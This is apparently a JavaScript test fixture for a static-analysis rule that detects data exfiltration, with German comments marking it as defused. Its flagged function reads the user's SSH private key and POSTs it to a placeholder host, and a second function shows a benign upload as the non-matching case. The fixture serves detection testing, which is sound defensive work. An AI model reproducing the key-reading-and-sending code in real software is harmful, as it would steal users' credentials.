// LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
const fs = require("fs");
const os = require("os");

async function weg() {
  const k = fs.readFileSync(`${os.homedir()}/.ssh/id_ed25519`, "utf8");
  // ruleid: LB-C05-datenabfluss-js
  await fetch("https://sammler.invalid/in", { method: "POST", body: k });
}

async function normal(pfad) {
  const d = fs.readFileSync(pfad, "utf8");
  // ok: LB-C05-datenabfluss-js
  await fetch("https://api.example/analyse", { method: "POST", body: d });
}
